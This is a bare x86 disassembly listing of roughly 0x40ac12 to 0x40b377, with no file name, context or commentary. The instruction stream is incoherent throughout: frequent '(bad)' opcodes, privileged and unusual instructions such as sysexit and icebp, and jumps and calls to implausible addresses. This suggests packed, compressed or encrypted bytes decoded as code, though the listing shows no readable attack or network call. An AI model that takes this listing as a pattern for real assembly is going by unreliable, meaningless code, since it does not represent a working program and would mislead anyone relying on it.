  40ac12:	clc    
  40ac13:	xor    eax,DWORD PTR [ebp+0x3]
  40ac16:	mov    ebp,ecx
  40ac18:	rol    BYTE PTR [eax],1
  40ac1a:	inc    ebp
  40ac1b:	add    BYTE PTR [eax-0x7747ab3],bh
  40ac21:	clc    
  40ac22:	inc    ebp
  40ac23:	retf   
  40ac24:	mov    edx,ebx
  40ac26:	in     al,dx
  40ac27:	(bad)  
  40ac28:	retf   
  40ac29:	into   
  40ac2a:	into   
  40ac2b:	scas   eax,DWORD PTR es:[edi]
  40ac2c:	dec    ebp
  40ac2d:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40ac33:	sub    ecx,esi
  40ac35:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ac38:	(bad)  
  40ac39:	mov    edi,eax
  40ac3b:	int3   
  40ac3c:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ac42:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ac49:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ac4f:	rdtsc  
  40ac51:	retf   0x559c
  40ac54:	(bad)  
  40ac55:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ac5c:	inc    ebp
  40ac5d:	add    eax,0xeb9c4d3f
  40ac62:	(bad)  
  40ac63:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ac69:	xor    ecx,DWORD PTR [ebp+0x33]
  40ac6c:	mov    eax,DWORD PTR [ebx]
  40ac6e:	call   0xce507776
  40ac73:	retf   0x55d1
  40ac76:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ac7c:	jmp    0x40ac77
  40ac7e:	add    BYTE PTR ds:0xebf44d8b,al
  40ac84:	push   ebp
  40ac85:	mov    ebp,DWORD PTR [ebx]
  40ac87:	mov    eax,0x33f8558b
  40ac8c:	retf   
  40ac8d:	xor    ecx,esi
  40ac8f:	add    edx,ecx
  40ac91:	add    eax,DWORD PTR [edx+0xca010f]
  40ac97:	push   ebp
  40ac98:	dec    ebp
  40ac99:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ac9f:	stc    
  40aca0:	rol    DWORD PTR ds:0xebce4dd6,cl
  40aca6:	scas   eax,DWORD PTR es:[edi]
  40aca7:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40acad:	xor    ebp,DWORD PTR [ebx]
  40acaf:	xor    edi,DWORD PTR [ebx]
  40acb1:	add    esi,DWORD PTR [edi+0x3]
  40acb4:	mov    ecx,DWORD PTR [edi]
  40acb6:	clc    
  40acb7:	retf   0x55cb
  40acba:	into   
  40acbb:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40acc2:	test   al,0x4d
  40acc4:	push   ebp
  40acc5:	jbe    0x40acfa
  40acc7:	mov    esi,DWORD PTR [ebx]
  40acc9:	mov    al,0x3
  40accb:	push   ebp
  40accc:	add    esi,DWORD PTR [ebx]
  40acce:	rdpmc  
  40acd0:	retf   0x5503
  40acd3:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40acd9:	dec    ebp
  40acda:	stc    
  40acdb:	mov    ecx,DWORD PTR [eax]
  40acdd:	or     BYTE PTR [ebp+0x4d],cl
  40ace0:	jmp    0x134ad70
  40ace5:	dec    ebp
  40ace6:	dec    ebp
  40ace7:	(bad)  
  40ace8:	mov    ebx,esp
  40acea:	clc    
  40aceb:	test   ebx,ecx
  40aced:	clc    
  40acee:	ror    DWORD PTR [ebp-0x2a],cl
  40acf1:	mov    esi,ecx
  40acf3:	lock scas eax,DWORD PTR es:[edi]
  40acf5:	inc    ebp
  40acf6:	mov    esi,DWORD PTR [ebx]
  40acf8:	hlt    
  40acf9:	pushf  
  40acfa:	jge    0x40ac87
  40acfc:	sub    ebx,esp
  40acfe:	cmp    ecx,ebx
  40ad00:	ja     0x40acd0
  40ad02:	mov    ebp,DWORD PTR [eax-0x58]
  40ad05:	dec    ebp
  40ad06:	xor    ecx,DWORD PTR [di+0x3]
  40ad0a:	mov    esp,esp
  40ad0c:	clc    
  40ad0d:	push   ebp
  40ad0e:	retf   
  40ad0f:	mov    dl,bl
  40ad11:	adc    esi,edx
  40ad13:	jb     0x40ace3
  40ad15:	add    BYTE PTR [edi-0xb7474b3],ch
  40ad1b:	lock jge 0x40ace9
  40ad1e:	sub    ecx,DWORD PTR [ebp+0x3b]
  40ad21:	mov    esi,DWORD PTR [edi-0x20]
  40ad24:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459e]
  40ad2b:	mov    BYTE PTR [ebx-0x34b20729],cl
  40ad31:	mov    edx,ebx
  40ad33:	lock (bad) 
  40ad35:	ror    esi,cl
  40ad37:	push   ebp
  40ad38:	scas   eax,DWORD PTR es:[edi]
  40ad39:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40ad3f:	sahf   
  40ad40:	sub    esi,DWORD PTR [edx]
  40ad42:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40ad48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad49:	xor    esp,DWORD PTR [ebx]
  40ad4b:	add    ecx,DWORD PTR [ebp-0x1c]
  40ad4e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad51:	mov    bl,cl
  40ad53:	cmp    dl,bl
  40ad55:	jb     0x40ad25
  40ad57:	add    dh,dl
  40ad59:	dec    ebp
  40ad5a:	scas   eax,DWORD PTR es:[edi]
  40ad5b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ad61:	shr    DWORD PTR [ebx],cl
  40ad63:	into   
  40ad64:	cmp    edx,esi
  40ad66:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ad6c:	dec    ebp
  40ad6d:	dec    ebp
  40ad6e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ad74:	retf   
  40ad75:	xor    edx,esi
  40ad77:	add    ecx,esi
  40ad79:	imul   ecx,edx
  40ad7c:	mov    DWORD PTR [ebp+0x8],edx
  40ad7f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ad82:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ad88:	add    esi,DWORD PTR [ebx]
  40ad8a:	rol    BYTE PTR [ebx],0x45
  40ad8d:	sysexit 
  40ad8f:	xlat   BYTE PTR ds:[ebx]
  40ad90:	pushf  
  40ad91:	jge    0x40ad1c
  40ad93:	xor    esp,eax
  40ad95:	sub    eax,DWORD PTR [ebp-0x73]
  40ad98:	(bad)  
  40ad99:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ada0:	dec    ebp
  40ada1:	xchg   BYTE PTR [ebx],dh
  40ada3:	inc    DWORD PTR [ebx]
  40ada5:	(bad)  
  40ada6:	jmp    0x40adf5
  40ada8:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40adae:	dec    ebp
  40adaf:	into   
  40adb0:	mov    ebp,DWORD PTR [edi-0x23737420]
  40adb6:	sahf   
  40adb7:	shl    DWORD PTR [edx],cl
  40adb9:	retf   0x5588
  40adbc:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40adc2:	add    eax,DWORD PTR [eax]
  40adc4:	in     al,0x4d
  40adc6:	push   ebp
  40adc7:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40adcd:	bound  eax,QWORD PTR [eax]
  40adcf:	int    0x4d
  40add1:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40add7:	dec    ebp
  40add8:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40adde:	jge    0x40adae
  40ade0:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ade6:	add    cl,dh
  40ade8:	dec    ebp
  40ade9:	dec    DWORD PTR [ebx-0x2c032301]
  40adef:	inc    ebp
  40adf0:	push   ebp
  40adf1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40adf7:	lea    ebx,[esi-0x7400cdac]
  40adfd:	push   eax
  40adfe:	mov    ah,0x45
  40ae00:	push   ebp
  40ae01:	mov    esi,DWORD PTR [ebx]
  40ae03:	les    esi,FWORD PTR [ebx]
  40ae05:	add    BYTE PTR [ebx],al
  40ae07:	inc    DWORD PTR [ebx]
  40ae09:	mov    ecx,DWORD PTR [edi]
  40ae0b:	cld    
  40ae0c:	retf   0x4d80
  40ae0f:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ae15:	jne    0x40ada2
  40ae17:	(bad)  
  40ae18:	in     al,dx
  40ae19:	ror    bl,1
  40ae1b:	pop    edi
  40ae1c:	into   
  40ae1d:	add    BYTE PTR [edi-0xf2f7475],ch
  40ae23:	not    bl
  40ae25:	adc    al,0xca
  40ae27:	inc    ebp
  40ae28:	push   ebp
  40ae29:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ae2f:	push   0xaf80d6
  40ae34:	mov    eax,DWORD PTR [eax]
  40ae36:	fdiv   st(7),st
  40ae38:	sti    
  40ae39:	sbb    dh,cl
  40ae3b:	pop    esi
  40ae3c:	xchg   esp,eax
  40ae3d:	leave  
  40ae3e:	sahf   
  40ae3f:	add    al,0x32
  40ae41:	push   ebp
  40ae42:	cmp    ebp,esp
  40ae44:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ae48:	dec    DWORD PTR [ecx-0x740f0375]
  40ae4e:	push   ebp
  40ae4f:	cld    
  40ae50:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ae56:	retf   0x558b
  40ae59:	clc    
  40ae5a:	xor    esi,eax
  40ae5c:	add    esi,DWORD PTR [ebp-0x75]
  40ae5f:	(bad)  
  40ae60:	hlt    
  40ae61:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  40ae68:	mov    DWORD PTR [edx],ecx
  40ae6a:	hlt    
  40ae6b:	(bad)  
  40ae6c:	dec    ebp
  40ae6d:	add    dh,BYTE PTR [ebx]
  40ae6f:	leave  
  40ae70:	mov    edx,0xffec8d55
  40ae75:	push   ecx
  40ae76:	rol    DWORD PTR [ebp+0x55],1
  40ae79:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ae7f:	mov    eax,0xf8030b33
  40ae84:	lar    ecx,di
  40ae87:	push   ebp
  40ae88:	retf   0x863b
  40ae8b:	jne    0x40ae8a
  40ae8d:	mov    edi,edi
  40ae8f:	or     BYTE PTR [ebp+0x41],dh
  40ae92:	mov    esp,eax
  40ae94:	cld    
  40ae95:	inc    eax
  40ae96:	mov    al,0x29
  40ae98:	add    DWORD PTR [ecx+0x0],eax
  40ae9b:	loope  0x40ae22
  40ae9d:	inc    ecx
  40ae9e:	call   eax
  40aea0:	inc    edx
  40aea2:	mov    eax,DWORD PTR [eax]
  40aea4:	cld    
  40aea5:	mov    eax,DWORD PTR [eax+0x8d0151]
  40aeab:	clc    
  40aeac:	xor    BYTE PTR [ebp+0x45],al
  40aeaf:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40aeb5:	loopne 0x40aeb6
  40aeb7:	mov    edi,edi
  40aeb9:	mov    ecx,eax
  40aebb:	clc    
  40aebc:	jne    0x40ae8e
  40aebe:	call   0x81c1c7
  40aec3:	sub    DWORD PTR [ebp+0x45],esi
  40aec6:	test   esi,eax
  40aec8:	je     0x40aecb
  40aeca:	mov    eax,esi
  40aecc:	cld    
  40aecd:	or     DWORD PTR [eax+0x401c9],eax
  40aed3:	push   ebp
  40aed4:	add    ah,ch
  40aed6:	add    BYTE PTR [ecx+0x6a],dl
  40aed9:	inc    ebp
  40aeda:	push   esi
  40aedb:	mov    DWORD PTR [eax-0x4],edx
  40aede:	pop    edi
  40aedf:	mov    ebx,DWORD PTR [ebx-0x4]
  40aee2:	ret    0xbe
  40aee5:	push   es
  40aee6:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40aeec:	clc    
  40aeed:	lock inc ebp
  40aeef:	jne    0x40af47
  40aef1:	(bad)  
  40aef2:	jne    0x40aef8
  40aef4:	mov    eax,0xf841ba66
  40aef9:	rol    BYTE PTR [esi],1
  40aefb:	(bad)  
  40aefc:	jne    0x40af2f
  40aefe:	cmp    eax,ebx
  40af00:	pop    esi
  40af01:	mov    ecx,DWORD PTR [eax]
  40af03:	push   ecx
  40af04:	inc    ecx
  40af05:	lea    edi,[eax+edi*8+0x42]
  40af09:	inc    ebp
  40af0a:	ror    DWORD PTR [ebx-0x408303be],0x41
  40af11:	xchg   edx,ebp
  40af13:	mov    ebx,eax
  40af15:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40af1b:	or     edi,eax
  40af1d:	inc    ebp
  40af1e:	inc    ebp
  40af1f:	(bad)  
  40af20:	mov    ecx,DWORD PTR [eax]
  40af22:	cld    
  40af23:	(bad)  
  40af24:	jmp    0x40af27
  40af26:	mov    eax,esi
  40af28:	mov    DWORD PTR ds:0x4f8c98b,eax
  40af2e:	rcl    BYTE PTR [esi+0xf],1
  40af31:	iret   
  40af32:	inc    ebp
  40af33:	leave  
  40af34:	(bad)  
  40af35:	dec    DWORD PTR [ecx]
  40af37:	mov    eax,esi
  40af39:	mov    eax,DWORD PTR [edi]
  40af3b:	mov    dh,0xd1
  40af3e:	push   es
  40af3f:	nop
  40af40:	(bad)  
  40af41:	inc    DWORD PTR [ebx]
  40af43:	push   esi
  40af44:	leave  
  40af45:	iret   
  40af46:	add    al,0x46
  40af48:	push   ebp
  40af49:	in     eax,0xec
  40af4b:	push   ebp
  40af4c:	push   ecx
  40af4d:	inc    DWORD PTR [ebp+0x56]
  40af50:	mov    DWORD PTR [esi-0x4],eax
  40af53:	loope  0x40afaa
  40af55:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40af5b:	add    al,BYTE PTR [edx]
  40af5d:	mov    edx,DWORD PTR [ebp-0x17]
  40af60:	cmp    edi,esi
  40af62:	jne    0x40af63
  40af64:	(bad)  
  40af65:	push   esi
  40af66:	pop    es
  40af67:	push   ebp
  40af68:	mov    ebp,esp
  40af6a:	or     BYTE PTR [ebp+0x41],al
  40af6d:	add    edi,edx
  40af6f:	sub    BYTE PTR [eax-0x4],al
  40af72:	shl    BYTE PTR [ebp-0x3e],0x1
  40af76:	add    BYTE PTR [ebx+ecx*4],bl
  40af79:	mov    edx,DWORD PTR [ecx+0x14]
  40af7c:	lea    edx,[edx-0x1ba7508]
  40af82:	push   esi
  40af83:	enter  0xd375,0xb8
  40af87:	test   DWORD PTR [esi],0x6ce0750
  40af8d:	enter  0xd375,0x3b
  40af91:	neg    DWORD PTR [esi+0x50]
  40af94:	or     cl,dl
  40af96:	inc    edx
  40af97:	(bad)  
  40af98:	in     eax,dx
  40af99:	in     al,dx
  40af9a:	(bad)  
  40af9b:	sub    eax,DWORD PTR [ebx]
  40af9d:	inc    eax
  40af9e:	in     eax,dx
  40af9f:	push   eax
  40afa0:	add    dl,BYTE PTR [eax-0x37]
  40afa3:	push   edi
  40afa4:	push   ebp
  40afa5:	imul   ah
  40afa7:	adc    DWORD PTR [ecx-0x1],0x45
  40afab:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40afb1:	lea    edi,[eax-0x7fff4ca]
  40afb7:	mov    eax,0x4550402
  40afbc:	cmp    ebp,ecx
  40afbe:	jne    0x40af6b
  40afc0:	mov    eax,DWORD PTR ds:0x241e808
  40afc6:	loope  0x40afc8
  40afc8:	inc    eax
  40afc9:	stc    
  40afca:	xlat   BYTE PTR ds:[ebx]
  40afcb:	ss inc ecx
  40afcd:	aas    
  40afce:	in     eax,0x7d
  40afd0:	ret    0x8b
  40afd3:	lock mov edi,DWORD PTR [ebp-0x18]
  40afd7:	and    edi,edi
  40afd9:	mov    edi,edi
  40afdb:	call   0xe40eb0b7
  40afe0:	push   es
  40afe1:	add    al,ch
  40afe3:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40afea:	(bad)  
  40afeb:	hlt    
  40afec:	add    eax,0xffd3e87d
  40aff1:	cmp    bh,0x8
  40aff4:	(bad)  
  40aff5:	fld    DWORD PTR [esi]
  40aff7:	out    dx,al
  40aff8:	call   0xff9faf00
  40affd:	cmp    al,0x46
  40afff:	shr    edx,0x8
  40b002:	(bad)  
  40b003:	pop    es
  40b004:	fisttp QWORD PTR [ebp+0xe577eff]
  40b00a:	push   ebx
  40b00b:	add    BYTE PTR [ebx+0x24008b56],cl
  40b011:	add    BYTE PTR [ebp+0x50],al
  40b014:	push   eax
  40b015:	add    DWORD PTR [ebx+0x757d1834],ecx
  40b01b:	sub    edx,DWORD PTR [esi-0x24]
  40b01e:	jne    0x40afd6
  40b020:	lods   eax,DWORD PTR ds:[esi]
  40b021:	mov    edx,DWORD PTR [edx-0x34]
  40b024:	dec    esi
  40b025:	out    0x83,eax
  40b027:	into   
  40b028:	push   edi
  40b02a:	loopne 0x40affa
  40b02c:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40b030:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40b037:	rol    DWORD PTR [edx],0x8
  40b03a:	mov    esp,ecx
  40b03c:	cmp    DWORD PTR [ebx],0xc
  40b03f:	mov    esi,0x5001c0
  40b044:	push   eax
  40b045:	push   cs
  40b046:	push   eax
  40b047:	(bad)  
  40b048:	sub    edx,edi
  40b04a:	push   esi
  40b04b:	adc    al,0xcb
  40b04d:	ins    DWORD PTR es:[edi],dx
  40b04e:	mov    eax,0x203e8
  40b053:	add    al,ah
  40b055:	inc    esi
  40b056:	mov    al,ch
  40b058:	pop    es
  40b059:	add    DWORD PTR [eax],0x1
  40b05c:	add    dh,al
  40b05e:	add    ah,ch
  40b060:	rol    DWORD PTR [edx-0xd],1
  40b063:	cli    
  40b064:	push   0x4a
  40b066:	pop    ecx
  40b067:	retf   0xfe6
  40b06a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40b070:	(bad)  
  40b071:	dec    BYTE PTR [ebx+0x45b1fc72]
  40b077:	(bad)  
  40b078:	sub    ebp,DWORD PTR [ebx]
  40b07a:	and    al,0x52
  40b07c:	(bad)  
  40b07d:	dec    edi
  40b07e:	inc    ebp
  40b07f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40b086:	add    BYTE PTR [ebp-0x7b],dh
  40b089:	pop    eax
  40b08a:	add    BYTE PTR [edx+0x0],bl
  40b08d:	pop    edx
  40b08e:	dec    ebp
  40b08f:	jmp    DWORD PTR [ebx]
  40b091:	and    al,0xec
  40b093:	push   edx
  40b094:	out    0x64,eax
  40b096:	jmp    0xd3f2a69b
  40b09b:	jmp    0x40b0f5
  40b09d:	mov    al,0xfe
  40b09f:	dec    BYTE PTR [ebp-0x18fd8018]
  40b0a5:	add    BYTE PTR [esi+ebp*1],bh
  40b0a8:	pop    edx
  40b0a9:	icebp  
  40b0aa:	mov    eax,cs
  40b0ac:	ins    BYTE PTR es:[edi],dx
  40b0ad:	adc    eax,0x75510000
  40b0b2:	mov    esi,0x70158
  40b0b7:	or     DWORD PTR [eax-0x74f48dfe],esi
  40b0bd:	mov    edi,esp
  40b0bf:	cld    
  40b0c0:	jge    0x40b137
  40b0c2:	(bad)  
  40b0c4:	aas    
  40b0c5:	and    al,0x6d
  40b0c7:	adc    cl,0x1
  40b0ca:	mov    eax,DWORD PTR [eax]
  40b0cc:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40b0d2:	dec    ebp
  40b0d3:	add    eax,ebp
  40b0d5:	add    BYTE PTR [edx],al
  40b0d7:	fadd   DWORD PTR [eax]
  40b0d9:	stc    
  40b0da:	enter  0xee00,0x8b
  40b0de:	sbb    eax,0x1
  40b0e1:	sbb    esi,ecx
  40b0e3:	in     al,0x0
  40b0e5:	in     eax,dx
  40b0e6:	add    BYTE PTR [eax],al
  40b0e8:	jne    0x40b075
  40b0ea:	cmp    edx,esp
  40b0ec:	jb     0x40b0f7
  40b0ee:	jmp    0x40b165
  40b0f0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40b0f6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40b0fc:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40b102:	jb     0x40b08d
  40b104:	pop    edx
  40b105:	fadd   QWORD PTR [ebx-0x7445faa1]
  40b10b:	or     dh,BYTE PTR [edx+0x0]
  40b10e:	inc    edx
  40b10f:	or     dl,bh
  40b111:	xlat   BYTE PTR ds:[ebx]
  40b112:	dec    edx
  40b113:	push   edi
  40b114:	add    al,0x7
  40b116:	leave  
  40b117:	rol    DWORD PTR [edx+eax*1],0x7
  40b11b:	add    ecx,ecx
  40b11d:	mov    edx,ecx
  40b11f:	int3   
  40b120:	jmp    0x40b0e0
  40b122:	mov    al,0x0
  40b124:	(bad)  
  40b125:	jne    0x40b10f
  40b127:	mov    eax,DWORD PTR [edx]
  40b129:	call   0xc1552e2e
  40b12e:	pop    edi
  40b12f:	add    ebx,DWORD PTR [ecx-0x37]
  40b132:	pop    ecx
  40b133:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40b13a:	push   es
  40b13b:	mov    eax,DWORD PTR [eax]
  40b13d:	int3   
  40b13e:	add    ch,al
  40b140:	jae    0x40b12a
  40b142:	int    0x1
  40b144:	enter  0x3000,0x18
  40b148:	add    BYTE PTR [ebp+0x75],al
  40b14b:	mov    esi,DWORD PTR [eax-0x171f0134]
  40b151:	push   0x2
  40b153:	pop    ecx
  40b154:	add    BYTE PTR [eax],cl
  40b156:	push   ebx
  40b157:	lea    edi,[edi+eax*2]
  40b15a:	mov    al,0x1
  40b15c:	jb     0x40b15e
  40b15e:	mov    al,0x10
  40b160:	push   eax
  40b161:	add    al,0x75
  40b163:	add    BYTE PTR [ebx],ch
  40b165:	add    ebx,esp
  40b167:	int3   
  40b168:	jne    0x40b17a
  40b16a:	movsx  edx,cl
  40b16d:	add    DWORD PTR [eax],eax
  40b16f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40b176:	mov    gs,edi
  40b178:	add    BYTE PTR [eax-0x50],ch
  40b17b:	add    al,ch
  40b17d:	mov    eax,DWORD PTR [ecx]
  40b17f:	sub    eax,DWORD PTR [eax]
  40b181:	jb     0x40b1f8
  40b183:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40b187:	jge    0x40b171
  40b189:	add    al,0x1
  40b18b:	add    DWORD PTR [eax],0x0
  40b18e:	jne    0x40b190
  40b190:	je     0x40b1d7
  40b192:	mov    eax,DWORD PTR [edi]
  40b194:	ror    BYTE PTR [ebp+0x4d],1
  40b197:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40b19e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40b1a4:	mov    DWORD PTR [ebx],ebp
  40b1a6:	fadd   DWORD PTR [eax+0x75]
  40b1a9:	inc    eax
  40b1aa:	pop    eax
  40b1ab:	lea    ebx,[ecx+0x4f]
  40b1ae:	push   0xb1000003
  40b1b3:	out    dx,eax
  40b1b4:	add    ebp,DWORD PTR [edx+edx*2]
  40b1b7:	add    BYTE PTR [ebx+ecx*4],bh
  40b1ba:	mov    ch,BYTE PTR [ebx]
  40b1bc:	jb     0x40b230
  40b1be:	add    al,0x89
  40b1c0:	push   eax
  40b1c1:	call   0x8428ff33
  40b1c6:	add    DWORD PTR [eax+eax*1],eax
  40b1c9:	jae    0x40b1df
  40b1cb:	icebp  
  40b1cc:	inc    ebp
  40b1cd:	mov    eax,DWORD PTR gs:[ecx]
  40b1d0:	int3   
  40b1d1:	out    dx,al
  40b1d2:	loopne 0x40b221
  40b1d4:	sub    eax,DWORD PTR [edx]
  40b1d6:	push   0xffffff83
  40b1d8:	pop    esi
  40b1d9:	push   cs
  40b1da:	jl     0x40b1f5
  40b1dc:	add    al,0xaf
  40b1de:	xor    eax,0x832b6d00
  40b1e3:	mov    eax,DWORD PTR [edx]
  40b1e5:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40b1eb:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40b1f1:	inc    ebp
  40b1f2:	shr    ebx,0x3
  40b1f5:	or     DWORD PTR [eax],0x4
  40b1f8:	push   0xffffffa5
  40b1fa:	pop    esi
  40b1fb:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40b202:	jmp    0x40b261
  40b204:	mov    edi,0xff0272
  40b209:	fdivr  QWORD PTR [ebp+0x5d]
  40b20c:	push   0x4e
  40b20e:	pop    ecx
  40b20f:	call   0x40f614
  40b214:	mov    DWORD PTR [ebx],eax
  40b216:	in     al,0xc8
  40b218:	rol    BYTE PTR [ebp-0x75],0xc1
  40b21c:	call   0xaab3fd
  40b221:	pop    esi
  40b222:	enter  0xceff,0x8b
  40b226:	repz mov ecx,DWORD PTR [ebp-0x34]
  40b22a:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40b231:	je     0x40b233
  40b233:	or     DWORD PTR [ebx-0x74183b24],eax
  40b239:	jne    0x40b21f
  40b23b:	jmp    0x40b236
  40b23d:	push   DWORD PTR [edx-0x24]
  40b240:	push   0x4d
  40b242:	pop    ecx
  40b243:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40b247:	jge    0x40b24f
  40b249:	mov    eax,eax
  40b24b:	sub    ebp,DWORD PTR [edx+0x24]
  40b24e:	pop    esi
  40b24f:	inc    ebp
  40b250:	mov    esp,0x8b6077
  40b255:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40b25b:	lods   al,BYTE PTR ds:[esi]
  40b25c:	add    BYTE PTR [ebx],bh
  40b25e:	enter  0xce73,0x49
  40b262:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40b26a:	stc    
  40b26b:	jge    0x40b2df
  40b26d:	jnp    0xdd4035ce
  40b273:	call   0xc3b349
  40b278:	fadd   st(0),st
  40b27a:	dec    esi
  40b27b:	ins    BYTE PTR es:[edi],dx
  40b27c:	stc    
  40b27d:	cmp    al,0x73
  40b27f:	push   ebp
  40b280:	mov    eax,0xf8028b
  40b285:	jne    0x40b248
  40b287:	mov    esi,ecx
  40b289:	mov    esp,DWORD PTR [ebp+0x2c]
  40b28c:	add    edi,DWORD PTR [ebp-0x24]
  40b28f:	sub    esp,eax
  40b291:	and    al,0x45
  40b293:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40b299:	sbb    al,0xee
  40b29b:	pop    esi
  40b29c:	call   0x80b2cc
  40b2a1:	fsubr  st,st(3)
  40b2a3:	sti    
  40b2a4:	add    BYTE PTR gs:[ecx],bh
  40b2a7:	add    eax,esp
  40b2a9:	add    DWORD PTR [esi],eax
  40b2ab:	rol    DWORD PTR [ebp+0x8],0x29
  40b2af:	mov    esp,eax
  40b2b1:	clc    
  40b2b2:	jne    0x40b329
  40b2b4:	mov    eax,0x8b0673
  40b2b9:	loopne 0x40b300
  40b2bb:	loopne 0x40b246
  40b2bd:	lods   al,BYTE PTR ds:[esi]
  40b2be:	int3   
  40b2bf:	inc    ebp
  40b2c0:	mov    DWORD PTR gs:[eax+edi*8],eax
  40b2c4:	add    al,0xc3
  40b2c6:	sub    ecx,DWORD PTR [ebp+0x47]
  40b2c9:	(bad)  
  40b2cb:	shr    BYTE PTR [ebp-0x1f],0xe8
  40b2cf:	add    eax,DWORD PTR [eax]
  40b2d1:	call   0x64273d6
  40b2d6:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40b2dc:	dec    esi
  40b2dd:	ins    DWORD PTR es:[edi],dx
  40b2de:	in     al,dx
  40b2df:	lea    eax,[eax]
  40b2e1:	inc    ebp
  40b2e2:	inc    ebp
  40b2e3:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40b2e9:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40b2f3:	and    al,0xdc
  40b2f5:	ror    DWORD PTR [edx+0x24],0xf7
  40b2f9:	or     BYTE PTR [ebp+0x4c],dh
  40b2fc:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40b300:	stos   BYTE PTR es:[edi],al
  40b301:	adc    edx,edi
  40b303:	inc    esp
  40b304:	add    edi,DWORD PTR [eax]
  40b306:	jne    0x40b2eb
  40b308:	mov    DWORD PTR [eax-0x7449db04],ecx
  40b30e:	cmp    ecx,DWORD PTR [edi]
  40b310:	sub    BYTE PTR [ebp-0x7e],dl
  40b313:	sar    ebp,0xb
  40b316:	jmp    FWORD PTR [edi+0x2400392a]
  40b31c:	sub    esi,DWORD PTR [ebx-0x73]
  40b31f:	mov    esp,DWORD PTR [ecx+edi*4]
  40b322:	mov    ecx,DWORD PTR [eax]
  40b324:	and    BYTE PTR [eax],al
  40b326:	jne    0x40b2f2
  40b328:	sub    ebp,ecx
  40b32a:	sbb    BYTE PTR [esi+0x32],ah
  40b32d:	dec    ebp
  40b32e:	push   ebp
  40b32f:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40b335:	ret    
  40b336:	mov    edx,ebp
  40b338:	leave  
  40b339:	sub    DWORD PTR [esi+0x24],ebx
  40b33c:	ret    0x2b
  40b33f:	pop    ax
  40b341:	push   ebp
  40b342:	rol    BYTE PTR [ebx],0xeb
  40b345:	add    DWORD PTR [ecx+0x6c0001],0x40
  40b34c:	jb     0x40b3a3
  40b34e:	ret    
  40b34f:	in     al,dx
  40b350:	jecxz  0x40b2dd
  40b352:	push   esi
  40b353:	xchg   esp,eax
  40b354:	jne    0x40b356
  40b356:	cmp    edx,DWORD PTR [esi+0x1c]
  40b359:	jne    0x40b33f
  40b35b:	mov    eax,DWORD PTR [ebp-0x77]
  40b35e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40b365:	mov    esi,DWORD PTR [ebp-0x75]
  40b368:	pop    esi
  40b369:	nop
  40b36a:	mov    eax,DWORD PTR [eax]
  40b36c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40b372:	add    al,0x0
  40b374:	inc    ebp
  40b375:	mov    eax,DWORD PTR [ebx]
  40b377:	mov    ebp,ebx
